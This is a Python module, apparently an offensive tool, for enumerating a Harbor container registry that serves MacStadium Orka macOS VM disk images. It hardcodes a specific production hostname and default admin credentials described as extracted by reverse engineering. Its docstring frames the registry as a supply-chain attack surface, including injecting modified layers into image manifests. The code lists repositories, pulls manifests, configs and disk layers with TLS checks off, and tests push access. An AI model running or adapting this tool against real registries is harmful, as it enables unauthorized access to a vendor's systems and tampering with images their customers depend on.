#!/usr/bin/env python3
"""
Harbor Registry Enumeration Module — MacStadium Orka supply-chain surface

Targets: OCI/Harbor registries serving Orka VM disk image layers.
Default creds: admin:Harbor12345 (extracted from Orka engine RE)
Default host:  orkv10000009-01.oci.las1.macstadiumcloud.com

Key content-type: application/vnd.macstadium.orka-engine.disk.layer.v1+lz4
Layer blobs are Apple bv41-framed LZ4 blocks (see core/bv41_decoder.py).

Supply-chain attack surface:
  - Read: pull any layer, decode with bv41_decoder, inspect macOS disk contents
  - Write: if push_access=True, inject modified layers into image manifests
  - Config blob: <1KB JSON with build metadata, paths, environment hints
"""

import base64
import json
import sys
import urllib.request
import urllib.error
from pathlib import Path

# bv41 decoder — works from any working directory
sys.path.insert(0, str(Path(__file__).parent.parent))
try:
    from core.bv41_decoder import probe_bv41, is_bv41
    _HAS_BV41 = True
except ImportError:
    _HAS_BV41 = False

try:
    import requests as _requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


HARBOR_DEFAULT_HOST = "orkv10000009-01.oci.las1.macstadiumcloud.com"
HARBOR_DEFAULT_USER = "admin"
HARBOR_DEFAULT_PASS = "Harbor12345"

ORKA_LAYER_MEDIA_TYPE = "application/vnd.macstadium.orka-engine.disk.layer.v1+lz4"
MANIFEST_ACCEPT = (
    "application/vnd.oci.image.manifest.v1+json,"
    "application/vnd.docker.distribution.manifest.v2+json"
)


def _basic_auth_header(user, password):
    token = base64.b64encode(f"{user}:{password}".encode()).decode()
    return f"Basic {token}"


def _http(method, url, headers=None, body=None, timeout=10, follow_redirects=True):
    """HTTP request via requests or urllib. Returns (status, headers_dict, body_bytes)."""
    hdrs = headers or {}
    if _HAS_REQUESTS:
        resp = _requests.request(
            method, url, headers=hdrs,
            data=body, timeout=timeout,
            allow_redirects=follow_redirects,
            verify=False,
        )
        return resp.status_code, dict(resp.headers), resp.content
    # urllib fallback
    req = urllib.request.Request(url, headers=hdrs, data=body, method=method)
    try:
        opener = urllib.request.build_opener()
        if not follow_redirects:
            opener = urllib.request.build_opener(NoRedirectHandler())
        with opener.open(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except urllib.error.URLError as e:
        raise ConnectionError(str(e)) from e


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class HarborEnumerator:
    def __init__(self, host=HARBOR_DEFAULT_HOST, user=HARBOR_DEFAULT_USER,
                 password=HARBOR_DEFAULT_PASS, timeout=10):
        self.base = f"https://{host}"
        self.auth = _basic_auth_header(user, password)
        self.timeout = timeout
        self._auth_headers = {"Authorization": self.auth}

    def _get(self, path, extra_headers=None):
        hdrs = dict(self._auth_headers)
        if extra_headers:
            hdrs.update(extra_headers)
        status, resp_headers, body = _http("GET", f"{self.base}{path}", hdrs, timeout=self.timeout)
        try:
            data = json.loads(body)
        except Exception:
            data = body.decode("utf-8", errors="replace") if isinstance(body, bytes) else body
        return status, resp_headers, data

    def catalog(self):
        """List all repositories."""
        status, _, data = self._get("/v2/_catalog")
        if status == 200 and isinstance(data, dict):
            return data.get("repositories", [])
        return []

    def tags(self, repo):
        """List tags for a repository."""
        status, _, data = self._get(f"/v2/{repo}/tags/list")
        if status == 200 and isinstance(data, dict):
            return data.get("tags", [])
        return []

    def manifest(self, repo, tag):
        """Pull manifest for repo:tag. Returns (status, manifest_dict_or_str)."""
        status, _, data = self._get(
            f"/v2/{repo}/manifests/{tag}",
            {"Accept": MANIFEST_ACCEPT},
        )
        return status, data

    def layer_metadata(self, repo, tag):
        """Return list of {digest, size, media_type} for each layer in the manifest."""
        status, mf = self.manifest(repo, tag)
        if status != 200 or not isinstance(mf, dict):
            return []
        layers = mf.get("layers", [])
        return [
            {
                "digest": l.get("digest", ""),
                "size": l.get("size", 0),
                "media_type": l.get("mediaType", ""),
            }
            for l in layers
        ]

    def probe_config(self, repo, tag):
        """Pull and parse the config blob (usually <1KB, contains build metadata)."""
        status, mf = self.manifest(repo, tag)
        if status != 200 or not isinstance(mf, dict):
            return {"error": f"manifest fetch failed: {status}"}
        config_desc = mf.get("config", {})
        digest = config_desc.get("digest", "")
        if not digest:
            return {"error": "no config digest in manifest"}
        status2, _, data = self._get(f"/v2/{repo}/blobs/{digest}")
        if status2 == 200 and isinstance(data, dict):
            return data
        return {"raw": str(data)[:512], "status": status2}

    def probe_bv41_layer(self, repo, tag, layer_index=0, probe_bytes=131072):
        """
        Pull the first `probe_bytes` of a disk layer blob and run probe_bv41()
        on it. Returns bv41 chunk stats dict, or an error dict.

        Requires: pip install lz4 (for full decode; probe_bv41 just reads headers)
        Falls back gracefully if Range not supported (206 not returned).
        """
        if not _HAS_BV41:
            return {"error": "bv41_decoder not importable"}

        layers = self.layer_metadata(repo, tag)
        if not layers:
            return {"error": "no layers found"}
        if layer_index >= len(layers):
            return {"error": f"layer_index {layer_index} out of range ({len(layers)} layers)"}

        layer = layers[layer_index]
        digest = layer["digest"]
        total_size = layer["size"]

        hdrs = dict(self._auth_headers)
        hdrs["Range"] = f"bytes=0-{probe_bytes - 1}"
        # Blob pulls may 307 to a storage backend — follow redirects
        status, resp_headers, body = _http(
            "GET",
            f"{self.base}/v2/{repo}/blobs/{digest}",
            hdrs,
            timeout=self.timeout,
            follow_redirects=True,
        )

        if status not in (200, 206):
            return {"error": f"blob fetch returned {status}", "digest": digest}

        got_bytes = len(body)
        if not is_bv41(body):
            return {
                "error": "response is not bv41 (wrong magic bytes)",
                "first_bytes_hex": body[:8].hex(),
                "http_status": status,
            }

        info = probe_bv41(body)
        info["digest"] = digest
        info["layer_total_size_bytes"] = total_size
        info["probed_bytes"] = got_bytes
        info["partial"] = status == 206 or got_bytes < total_size
        return info

    def check_push_access(self, repo):
        """
        Initiate a blob upload to test write access. POSTs to
        /v2/{repo}/blobs/uploads/ — a 202 means the registry accepted the
        session; we immediately abandon it without pushing any data.
        Returns True if push is permitted, False otherwise.
        """
        hdrs = dict(self._auth_headers)
        hdrs["Content-Length"] = "0"
        status, resp_headers, _ = _http(
            "POST",
            f"{self.base}/v2/{repo}/blobs/uploads/",
            hdrs,
            body=b"",
            timeout=self.timeout,
            follow_redirects=False,
        )
        return status == 202

    def run(self, repo="library/tahoe-base"):
        """Orchestrate all checks. Returns findings dict."""
        findings = {"host": self.base, "repo": repo}

        # Catalog
        repos = self.catalog()
        findings["catalog"] = repos
        findings["catalog_count"] = len(repos)

        # Tags
        tag_list = self.tags(repo)
        findings["tags"] = tag_list
        tag = tag_list[0] if tag_list else "latest"

        # Manifest + layer metadata
        layers = self.layer_metadata(repo, tag)
        findings["layers"] = layers
        findings["layer_count"] = len(layers)

        orka_layers = [l for l in layers if l["media_type"] == ORKA_LAYER_MEDIA_TYPE]
        findings["orka_layer_count"] = len(orka_layers)

        # Config blob (build metadata)
        findings["config"] = self.probe_config(repo, tag)

        # bv41 probe on first Orka layer
        if orka_layers:
            target_idx = layers.index(orka_layers[0])
            findings["bv41_probe"] = self.probe_bv41_layer(repo, tag, layer_index=target_idx)
        else:
            findings["bv41_probe"] = {"error": "no Orka layer media type found"}

        # Push access
        findings["push_access"] = self.check_push_access(repo)

        return findings


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Harbor registry enumeration for Orka RE")
    parser.add_argument("--host", default=HARBOR_DEFAULT_HOST)
    parser.add_argument("--user", default=HARBOR_DEFAULT_USER)
    parser.add_argument("--password", default=HARBOR_DEFAULT_PASS)
    parser.add_argument("--repo", default="library/tahoe-base")
    parser.add_argument("--tag", default=None)
    parser.add_argument("--layer-index", type=int, default=0)
    parser.add_argument("--probe-bytes", type=int, default=131072)
    args = parser.parse_args()

    e = HarborEnumerator(host=args.host, user=args.user, password=args.password)

    if args.tag:
        print(json.dumps(e.probe_bv41_layer(args.repo, args.tag, args.layer_index, args.probe_bytes), indent=2))
    else:
        result = e.run(args.repo)
        print(json.dumps(result, indent=2))
